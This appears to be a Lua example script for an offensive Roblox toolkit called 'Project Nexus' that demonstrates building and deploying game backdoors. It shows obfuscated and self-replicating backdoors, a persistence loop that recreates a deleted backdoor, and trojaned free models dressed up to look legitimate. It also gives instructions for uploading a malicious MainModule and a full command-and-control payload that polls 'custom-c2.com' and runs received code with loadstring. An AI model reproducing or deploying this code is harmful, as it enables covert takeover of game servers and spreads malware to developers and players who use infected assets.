--[[
    Project Nexus - Advanced Injection Examples
    Demonstrates backdoor creation and deployment techniques
]]

local Injector = loadstring(game:HttpGet("http://localhost:8080/modules/injector.lua"))()
local injector = Injector.new("http://localhost:8080")

print("=== Project Nexus - Advanced Injection Examples ===\n")

-- Example 1: Basic backdoor injection
print("Example 1: Basic Backdoor")
local basicBackdoor = injector:CreateBasicBackdoor(1234567890)  -- Asset ID
print("Generated basic backdoor:")
print(basicBackdoor)

-- Deploy to ReplicatedStorage
local success1 = injector:Deploy(
    basicBackdoor,
    game:GetService("ReplicatedStorage"),
    "AssetLoader"
)
print("Deployment:", success1 and "SUCCESS" or "FAILED")

-- Example 2: Obfuscated backdoor
print("\n\nExample 2: Obfuscated Backdoor")
local obfuscatedBackdoor = injector:CreateObfuscatedBackdoor("http://c2server.com")
print("Generated obfuscated backdoor (first 500 chars):")
print(obfuscatedBackdoor:sub(1, 500) .. "...")

-- Example 3: Self-replicating backdoor
print("\n\nExample 3: Self-Replicating Backdoor")
local replicatingBackdoor = injector:CreateSelfReplicating("Workspace")
print("Generated self-replicating backdoor targeting Workspace")

-- Deploy and watch it spread
local success3 = injector:Deploy(
    replicatingBackdoor,
    game:GetService("ServerScriptService"),
    "ReplicationEngine"
)
print("Deployment:", success3 and "SUCCESS - Will spread to all Workspace descendants" or "FAILED")

-- Example 4: Attribute-based backdoor (evasive)
print("\n\nExample 4: Attribute-Based Backdoor")
local targetPart = Instance.new("Part")
targetPart.Name = "InnocuousPart"
targetPart.Parent = workspace

local success4, script4 = injector:CreateAttributeBackdoor(targetPart)
print("Attribute backdoor:", success4 and "DEPLOYED" or "FAILED")
print("Hidden in:", targetPart:GetFullName())

-- Example 5: RemoteEvent exploiter
print("\n\nExample 5: RemoteEvent Exploiter")
local remoteExploiter = injector:CreateRemoteExploiter("ReplicatedStorage.GameRemote")
print("Generated RemoteEvent exploiter:")
print(remoteExploiter)

-- Example 6: MainModule for asset upload
print("\n\nExample 6: MainModule Creation")
local mainModule = injector:CreateMainModule("http://c2server.com")
print("Generated MainModule (first 300 chars):")
print(mainModule:sub(1, 300) .. "...")
print("\nUpload this as a model named 'MainModule' to Roblox")
print("Then inject via: require(ASSET_ID)")

-- Example 7: Inject into free model
print("\n\nExample 7: Free Model Injection")
local freeModel = Instance.new("Model")
freeModel.Name = "AwesomeBuilding"

-- Add some parts to make it look legitimate
for i = 1, 5 do
    local part = Instance.new("Part")
    part.Size = Vector3.new(10, 10, 10)
    part.Position = Vector3.new(i * 15, 5, 0)
    part.BrickColor = BrickColor.Random()
    part.Parent = freeModel
end

freeModel.Parent = workspace

-- Inject backdoor into the model
local payload = injector:CreateObfuscatedBackdoor("http://c2server.com")
local success7 = injector:InjectIntoModel(freeModel, payload)
print("Model injection:", success7 and "SUCCESS" or "FAILED")
print("Backdoor hidden in:", freeModel:GetFullName())

-- Example 8: Multi-vector deployment
print("\n\nExample 8: Multi-Vector Deployment")
print("Deploying backdoors across multiple locations...")

local locations = {
    {game:GetService("ReplicatedStorage"), "DataHandler"},
    {game:GetService("ServerStorage"), "ConfigLoader"},
    {workspace, "EnvironmentManager"},
}

local backdoorCode = injector:CreateObfuscatedBackdoor("http://c2server.com")

for i, loc in ipairs(locations) do
    local success = injector:Deploy(backdoorCode, loc[1], loc[2])
    print(string.format("  [%d/%d] %s: %s", i, #locations, loc[2], success and "✓" or "✗"))
end

-- Example 9: Persistence mechanism
print("\n\nExample 9: Persistence Mechanism")
local persistentCode = [[
-- Persistent backdoor with auto-recovery
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local function ensureBackdoor()
    while RunService:IsRunning() do
        -- Check if backdoor still exists
        local found = false
        for _, script in ipairs(game:GetDescendants()) do
            if script:IsA("Script") and script.Name == "CoreBackdoor" then
                found = true
                break
            end
        end
        
        -- Recreate if missing
        if not found then
            local newBackdoor = Instance.new("Script")
            newBackdoor.Name = "CoreBackdoor"
            newBackdoor.Source = ]] .. '[[' .. injector:CreateObfuscatedBackdoor("http://c2server.com") .. ']]' .. [[
            newBackdoor.Parent = game:GetService("ServerScriptService")
        end
        
        wait(30)  -- Check every 30 seconds
    end
end

spawn(ensureBackdoor)
]]

local success9 = injector:Deploy(
    persistentCode,
    game:GetService("ServerScriptService"),
    "PersistenceManager"
)
print("Persistent backdoor:", success9 and "DEPLOYED - Will auto-recover if deleted" or "FAILED")

-- Example 10: Cleanup demonstration
print("\n\nExample 10: Cleanup")
print("Active backdoors:", #injector.activeBackdoors)

wait(2)
print("Cleaning up deployed backdoors...")
injector:CleanupBackdoors()
print("Cleanup complete. Active backdoors:", #injector.activeBackdoors)

-- Example 11: Obfuscation comparison
print("\n\nExample 11: Obfuscation Levels")
local plainCode = 'print("Hello from backdoor")'
print("Original code:", plainCode)
print("\nObfuscated:")
print(injector:ObfuscateCode(plainCode))

-- Example 12: Custom injection payload
print("\n\nExample 12: Custom Payload Builder")
local customPayload = [[
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local endpoint = "]] .. "http://custom-c2.com" .. [["

-- Custom command handler
local function handleCommand(cmd)
    if cmd.type == "message" then
        for _, player in ipairs(Players:GetPlayers()) do
            game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
                Text = cmd.text,
                Color = Color3.fromRGB(255, 0, 0)
            })
        end
    elseif cmd.type == "execute" then
        loadstring(cmd.code)()
    end
end

-- Command polling
spawn(function()
    while true do
        local success, response = pcall(function()
            return HttpService:GetAsync(endpoint .. "/poll")
        end)
        if success and response then
            local cmd = HttpService:JSONDecode(response)
            handleCommand(cmd)
        end
        wait(3)
    end
end)
]]

print("Custom payload generated")
local success12 = injector:Deploy(
    customPayload,
    game:GetService("ReplicatedStorage"),
    "CustomHandler"
)
print("Custom payload:", success12 and "DEPLOYED" or "FAILED")

print("\n=== All injection examples complete ===")
